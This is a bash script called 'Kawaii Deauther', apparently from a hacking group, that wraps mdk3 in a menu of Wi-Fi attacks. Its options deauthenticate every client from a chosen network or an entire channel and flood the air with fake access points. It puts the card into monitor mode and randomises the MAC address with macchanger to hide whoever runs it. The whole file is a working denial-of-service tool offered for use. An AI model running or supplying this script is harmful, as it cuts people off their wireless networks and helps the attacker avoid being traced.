#!/bin/bash

# Name: Kawaii Deauther
# Author: Arya Narotama (4WSec)
# Github: github.com/aryanrtm
# Instagram: instagram.com/aryanrtm_
# Give me the credits if you recode this tool. Don't be a SKID!
# Kawaii Deauther is made with <3 by Arya Narotama - Anon Cyber Team - 2020


### Colors ###
BK=$(tput setaf 0) # Black
GR=$(tput setaf 2) # Green
RD=$(tput setaf 1) # Red
YW=$(tput setaf 3) # Yellow
CY=$(tput setaf 6) # Cyan
WH=$(tput setaf 7) # White
NT=$(tput sgr0) # Netral
BD=$(tput bold) # Bold
BG=$(tput setab 4) # Background Color


# Check root
function chk_root () {
	if [[ "$(id -u)" -ne 0 ]]; then
		banner
		printf " ${BD}${WH}[${RD}!${WH}] ${RD}KawaiiDeauther must be run as root ${YW}｡ﾟ･（>﹏<）･ﾟ｡\n"
		exit 1
	fi
}

# Function for displaying banner
function banner () {
	printf "${BD}
${GR}┊┊                  ${WH}╭━━━━━━
${GR}┊┊┊┊${YW}╭━╱▔▔▔╲━╮${GR}┊┊${YW}☼   ${WH}╭╯${RD}KAWAII
${GR}┊╱╲┊${YW}╰▏▆┊┊┊▇▕╯${GR}╱╲┊   ${WH}┃${RD}DEAUTHER
${GR}▔▔▔▔▔${YW}▏┊┊▇┊┊▕${GR}▔▔▔▔   ${WH}╰┳━━━━━━
${GR}┈${YW}╱▔▔╱┊┊━┻━┊┊╲▔▔╲  ${WH}━━╯${YW}
${GR}┈${YW}╲▂╱╭━━╮┊╭━━╮╲▂╱
${GR}┈┈${YW}▔▔╰┻┻╯▔╰┻┻╯▔▔${GR}┈┈ ${RD}© 4WSec - 2020

"
}

function banner_2 () {
	printf "
${BD}${RD}
\t@@@@@                                        @@@@@
\t@@@@@@@                                      @@@@@@@
\t@@@@@@@           @@@@@@@@@@@@@@@            @@@@@@@
\t @@@@@@@@       @@@@@@@@@@@@@@@@@@@        @@@@@@@@
\t     @@@@@     @@@@@@@@@@@@@@@@@@@@@     @@@@@
\t       @@@@@  @@@@@@@@@@@@@@@@@@@@@@@  @@@@@
\t         @@  @@@@@@@@@@@@@@@@@@@@@@@@@  @@
\t            @@@@@@@    @@@@@@    @@@@@@
\t            @@@@@@      @@@@      @@@@@
\t            @@@@@@      @@@@      @@@@@
\t             @@@@@@    @@@@@@    @@@@@
\t               @@@@@@@@@@  @@@@@@@@@
\t           @@@@  @@@@ ${WH}@ @ @ @ ${RD}@@@@  @@@@
\t          @@@@@   @@@ ${WH}@ @ @ @ ${RD}@@@   @@@@@
\t        @@@@@      @@@@@@@@@@@@@      @@@@@
\t      @@@@          @@@@@@@@@@@          @@@@
\t   @@@@@              @@@@@@@              @@@@@
\t  @@@@@@@                                 @@@@@@@
\t   @@@@@                                   @@@@@


"
}

# Function to get the interface
function get_interface () {
	printf " ${BD}${GR}Interface List ${WH}\n"
	printf " ==============\n\n"
	interface=$(ifconfig -a | sed 's/[ \t].*//;/^$/d' | tr -d ':' > .iface.tmp)
	con=1
	for x in $(cat .iface.tmp); do
		printf "${WH}%s) ${GR}%s\n" $con $x
		let con++
	done
	echo -ne "\n${RD}4WSec${GR}@${RD}Kawaii: ${WH}>> "; read iface
	selected_interface=$(sed ''$iface'q;d' .iface.tmp)
	IFS=$'\n'
}

# Function to enable changing to monitor mode
function monitor_mode () {
	ifconfig $selected_interface down
	iwconfig $selected_interface mode monitor
	# Change MAC Address
	macchanger -r $selected_interface
	ifconfig $selected_interface up
}

# Function to deactivate monitor mode
function deactivate_destruction () {
	clear
	sleep 3
	ifconfig $selected_interface down >> /dev/null 2>&1
	macchanger -p $selected_interface >> /dev/null 2>&1
	iwconfig $selected_interface mode managed >> /dev/null 2>&1
	ifconfig $selected_interface up >> /dev/null 2>&1
	clear
	banner
	printf " ${BD}${WH}[${RD}*${WH}] ${RD}Deactivate Destruction ...\n"
	printf " ${BD}${WH}[${RD}*${WH}] ${RD}Arigatō, Nyan ... ${GR}~(=^‥^)丿\n"
	rm -f .iface.tmp
	exit
}

function deactivate_destruction_2 () {
	clear
	sleep 3
	ifconfig $selected_interface down >> /dev/null 2>&1
	macchanger -p $selected_interface >> /dev/null 2>&1
	iwconfig $selected_interface mode managed >> /dev/null 2>&1
	ifconfig $selected_interface up >> /dev/null 2>&1
	nmcli device connect $selected_interface >> /dev/null 2>&1
	clear
	banner
	printf " ${BD}${WH}[${RD}*${WH}] ${RD}Deactivate Destruction ...\n"
	printf " ${BD}${WH}[${RD}*${WH}] ${RD}Arigatō, Nyan ... ${GR}~(=^‥^)丿\n"
	rm -f .iface.tmp
	rm -f $rand_ssid_list.txt
	exit
}

### Menu ###
clear
chk_root
banner
printf " ${WH}1) ${GR}Takedown with SSID\n"
printf " ${WH}2) ${GR}Takedown all channels\n"
printf " ${WH}3) ${GR}Spam many fake AP\n"
printf " ${WH}4) ${GR}Exit\n"
echo -ne "\n${RD}4WSec${GR}@${RD}Kawaii: ${WH}>> "; read attack
clear

if [[ $attack == 1 ]]; then
	banner
	printf "${NT}\n"
	nmcli dev wifi
	echo -ne "\n${RD}4WSec${GR}@${RD}Kawaii: ${WH}>> "; read attck_ssid
	clear
	banner
	get_interface
	clear
	banner_2
	printf "                         ${WH}[ ${GR}Kawaii Deauther ${WH}]\n"
	printf "              ${WH}===== ${RD}(◣_◢) Begun To Destroy (◣_◢) ${WH}=====\n\n"
	monitor_mode >> /dev/null 2>&1
	trap deactivate_destruction EXIT ### CTRL+C to exit
	mdk3 $selected_interface d -n "$attck_ssid"
elif [[ $attack == 2 ]]; then
	banner
	printf "${NT}\n"
	nmcli dev wifi
	echo -ne "\n${RD}4WSec${GR}@${RD}Kawaii: ${WH}>> "; read attck_chnl
	clear
	banner
	get_interface
	clear
	banner_2
	printf "                         ${WH}[ ${GR}Kawaii Deauther ${WH}]\n"
	printf "              ${WH}===== ${RD}(◣_◢) Begun To Destroy (◣_◢) ${WH}=====\n\n"
	monitor_mode >> /dev/null 2>&1
	trap deactivate_destruction EXIT ### CTRL+C to exit
	mdk3 $selected_interface d -c $attck_chnl
elif [[ $attack == 3 ]]; then
	banner
	get_interface
	clear
	banner
	printf "${WH}1) ${GR}Use default wordlist\n"
	printf "${WH}2) ${GR}Use custom wordlist\n"
	echo -ne "\n${RD}4WSec${GR}@${RD}Kawaii: ${WH}>> "; read spm
	if [[ $spm == 1 ]]; then
		nmcli device disconnect $selected_interface >> /dev/null 2>&1
		clear
		banner_2
		trap deactivate_destruction_2 EXIT ### CTRL+C to exit
		sleep 2
		printf "                         ${WH}[ ${GR}Kawaii Deauther ${WH}]\n"
		printf "              ${WH}===== ${RD}(◣_◢) Begun To Destroy (◣_◢) ${WH}=====\n\n"
		ifconfig $selected_interface down
		macchanger -r $selected_interface >> /dev/null 2>&1
		iwconfig $selected_interface mode monitor
		ifconfig $selected_interface up
		trap deactivate_destruction_2 EXIT ### CTRL+C to exit
		mdk3 $selected_interface b -f ssid_list.txt -a -s 1000
	elif [[ $spm == 2 ]]; then
		con=1
		nmcli device disconnect $AD > /dev/null 2>&1
		clear
		banner
		printf "\n${RD}4WSec${GR}@${RD}Kawaii${WH}(SSID(Name of Network)) >> "; read rand_ssid;
		printf "\n${RD}4WSec${GR}@${RD}Kawaii${WH}(How Many SSID) >> "; read con_ssid;
		while [[ $con -lt $con_ssid ]] || [[ $con -eq $con_ssid ]]; do
			echo $rand_ssid $con >> $rand_ssid"_list.txt"
			let con=con+1
		done
		clear
		banner_2
		trap deactivate_destruction_2 EXIT ### CTRL+C to exit
		sleep 2
		printf "                         ${WH}[ ${GR}Kawaii Deauther ${WH}]\n"
		printf "              ${WH}===== ${RD}(◣_◢) Begun To Destroy (◣_◢) ${WH}=====\n\n"
		ifconfig $selected_interface down
		macchanger -r $selected_interface >> /dev/null 2>&1
		iwconfig $selected_interface mode monitor
		ifconfig $selected_interface up
		trap deactivate_destruction_2 EXIT
		mdk3 $selected_interface b -f $rand_ssid"_list.txt" -a -s 1000
	else
		printf " ${BD}${WH}[${RD}!${WH}] ${RD}Invalid Option ...\n"
		sleep 4
		trap deactivate_destruction_2 EXIT ### CTRL+C to exit
	fi
else
	printf " ${BD}${WH}[${RD}!${WH}] ${RD}Invalid Option ...\n"
	sleep 4
	trap deactivate_destruction EXIT ### CTRL+C to exit
fi
